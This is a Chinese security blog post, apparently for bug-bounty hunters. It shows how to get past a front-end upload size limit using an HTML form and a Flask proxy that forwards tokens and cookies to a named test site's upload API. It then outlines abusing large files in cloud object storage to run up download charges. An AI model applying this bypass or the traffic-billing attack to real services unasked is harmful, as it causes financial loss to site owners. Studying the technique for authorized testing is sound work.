> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzkwMTc2MDE3OA==&mid=2247486854&idx=1&sn=789805dc2c0ad02645cc3b83fe748f14

#  SRC漏洞小技巧——文件上传垃圾漏洞之绕过上传大小  
原创 Ice  Ice ThirdSpace   2025-06-16 01:45  
  
在日常渗透测试中会发现有的上传功能的地方会限制上传大小，例如15M，如果绕过前端的这个提示，使用BURP抓包超大包 BURP会特别卡，导致无法发送，因此写了个小html和py来传输数据。  
  
  
如下图所示可能会遇到这类功能  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ZmiaibBst1BVRd6fCoayXfjuMySppvbC5wnDbrf60grg6WiaVMLiboGDEHszjgwHVry9HszUO9f7RbmOag08ibsSpdg/640?wx_fmt=other&from=appmsg "")  
  
  
前端HTML代码  

```
<!DOCTYPE html>
<html lang=&#34;zh-CN&#34;>
<head>
    <meta charset=&#34;UTF-8&#34;>
    <title>文件上传演示（代理版）</title>
    <style>
        /* 样式保持不变 */
        body {
            font-family: Arial, sans-serif;
            max-width: 600px;
            margin: 20px auto;
            padding: 20px;
        }
        .upload-box {
            border: 2px dashed #ccc;
            padding: 30px;
            text-align: center;
            margin: 20px 0;
        }
        #status {
            margin-top: 15px;
            padding: 10px;
            border-radius: 4px;
        }
.input-group {
margin: 10px 0;
text-align: left;
	}


.input-group label {
display: block;
margin-bottom: 5px;
color: #666;
		}


.input-group input {
width: 100%;
padding: 8px;
border: 1px solid #ddd;
border-radius: 4px;
box-sizing: border-box;
		}


        .success { background: #dff0d8; color: #3c763d; }
        .error { background: #f2dede; color: #a94442; }
    </style>
</head>
<body>
    <h2>文件上传演示</h2>


<div class=&#34;upload-box&#34;>
    <!-- 新增：Authorization输入框 -->
    <div class=&#34;input-group&#34;>
        <label for=&#34;authInput&#34;>Authorization:</label>
        <input type=&#34;text&#34; id=&#34;authInput&#34; placeholder=&#34;Bearer token (可选)&#34;>
    </div>


    <!-- 新增：Cookie输入框 -->
    <div class=&#34;input-group&#34;>
        <label for=&#34;cookieInput&#34;>Cookie:</label>
        <input type=&#34;text&#34; id=&#34;cookieInput&#34; placeholder=&#34;Cookie值 (可选)&#34;>
    </div>


    <input type=&#34;file&#34; id=&#34;fileInput&#34; accept=&#34;.pdf,.doc,.docx&#34;>
    <button onclick=&#34;uploadFile()&#34;>上传文件</button>
    <div id=&#34;status&#34;></div>
</div>


    <script>
async function uploadFile() {
const fileInput = document.getElementById('fileInput');
const statusDiv = document.getElementById('status');
const authInput = document.getElementById('authInput');
const cookieInput = document.getElementById('cookieInput');


if (!fileInput.files.length) {
showStatus('请先选择文件', 'error');
return;
		}


// +++ 修复1: 确保FormData初始化 +++
const formData = new FormData();
		formData.append('dir', 'user_pri');
		formData.append('file', fileInput.files[0]);


// 构建动态Header
const headers = {};
if (authInput.value) headers['Authorization'] = authInput.value;
if (cookieInput.value) headers['Cookie'] = cookieInput.value;


try {
const response = await fetch('http://localhost:5000/upload', {
method: 'POST',
headers: headers,
body: formData // 使用已初始化的formData
			});


if (response.ok) {
const result = await response.json();
showStatus(`文件上传成功！文件名：${result.filename}`, 'success');
			} else {
showStatus(`上传失败：${response.statusText}`, 'error');
			}
		} catch (error) {
showStatus(`网络错误：${error.message}`, 'error');
		}
	}


        function showStatus(message, type) {
            const statusDiv = document.getElementById('status');
            statusDiv.className = type;
            statusDiv.textContent = message;


            setTimeout(() => {
                statusDiv.className = '';
                statusDiv.textContent = '';
            }, 3000);
        }
    </script>
</body>
</html>
```

  
  
python代码  

```
from flask import Flask, request
from flask_cors import CORS
import requests


app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 允许100MB文件
CORS(app)


@app.route('/upload', methods=['POST'])
def upload():
    try:
        # 获取请求头
        auth_header = request.headers.get('Authorization', '')
        cookie_header = request.headers.get('Cookie', '')
        file = request.files['file']


        # 转发请求到目标API
        response = requests.post(
            'https://test.digifttest.com/api/file/upload',
            files={'file': (file.filename, file.stream)},
            headers={
                'Authorization': auth_header,
                'Cookie': cookie_header
            },
            data={'dir': 'user_pri'}
        )


        # 打印完整的返回包信息到控制台
        print(&#34;=&#34;*50 + &#34; 响应详情 &#34; + &#34;=&#34;*50)
        print(f&#34;状态码: {response.status_code}&#34;)
        print(&#34;\n响应头:&#34;)
        for key, value in response.headers.items():
            print(f&#34;  {key}: {value}&#34;)
        print(&#34;\n响应体:&#34;)
        try:
            print(response.json())  # 尝试解析JSON
        except:
            print(response.text)    # 纯文本或二进制内容
        print(&#34;=&#34;*110 + &#34;\n&#34;)


        # 返回完整响应信息
        return (
            response.content, 
            response.status_code,
            dict(response.headers)  # 携带原始响应头
        )


    except Exception as e:
        print(f&#34;! 错误: {str(e)}&#34;)
        return {
            &#34;error&#34;: str(e),
            &#34;message&#34;: &#34;代理服务器内部错误&#34;
        }, 500


if __name__ == '__main__':
    app.run(port=5000, debug=True)  # 启用debug模式显示详细错误
```

  
  
填写凭据  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZmiaibBst1BVRd6fCoayXfjuMySppvbC5whlkPoGalUOicbvORA4K08oXjNFmNk3Fq5DDZeQqTV5rfCiap61UagT3w/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZmiaibBst1BVRd6fCoayXfjuMySppvbC5wNfWl7G1b4TC4tXg1YrNjph6rXR6bFarCBQ8fOEov7lniaMibdJM8jfUg/640?wx_fmt=png&from=appmsg "")  
  
上传成功，这里我选择了一个20M的PDF文件上传成功，绕过了前端的限制，但是我还是上传不了更大的文件，例如200M  
  
应该是Spring boot或者Nginx层再次进行了限制  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZmiaibBst1BVRd6fCoayXfjuMySppvbC5wcMh1Bf1amLVeyDWaLp0F393fskNDQo8AiaoEwdb3OTJqbPrKBJ5OgDQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
那么这里有什么作用呢，其实这里是一个类似攻击链，例如可以上传大包给OSS存储，OSS存储被访问是需要流量收费的，如果原本是15M，那麽攻击者就得刷流量刷到死，那如果攻击者上传的文件是是100M呢 ,1G的文件被刷流量呢，这个的危害就比较大了。  
  
  
  
我们可以通过以下案例学习  
> OSS案例  
  
> 梦康，公众号：加班写bug[血亏 2W，一个 OSS 安全漏洞](https://mp.weixin.qq.com/s/e7uoSkqLQU1njj8VxY6i7w)  
  
  
  
  
也就是说一个照片大小大概在1570G/2554=600M左右  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZmiaibBst1BVRd6fCoayXfjuMySppvbC5w95UCdHUvGqHficIyApMVSypSf7VIub5k0eamWVW1xPyQyjSJV19ZkmQ/640?wx_fmt=png&from=appmsg "")  
  
  
我们可以查看阿里云的OSS收费详情  
> 阿里云OSS  
  
> https://www.aliyun.com/price/product?spm=5176.8465980.console-base_help.4.4e701450EnmFQ6#/oss/detail/ossbag  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZmiaibBst1BVRd6fCoayXfjuMySppvbC5wucfuwUnysb8YAMBqiaCiaQXxEJmnt35aZqGoiaOO1hBibXfSBC5jE5tXkQ/640?wx_fmt=png&from=appmsg "")  
  
流入（上传不用钱）  
  
流出（访问需要收费约0.5/G）  
  
  
如果公司主要做海外服务的，那么配合这个大文件进行访问攻击，可以造成较大的金钱损失  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZmiaibBst1BVRd6fCoayXfjuMySppvbC5w1Gno4ErDNR8kt713Hl2aBiaKyCVZsyhKr0JWO0MkmX58c8xKzVFjpQw/640?wx_fmt=png&from=appmsg "")  
  
  
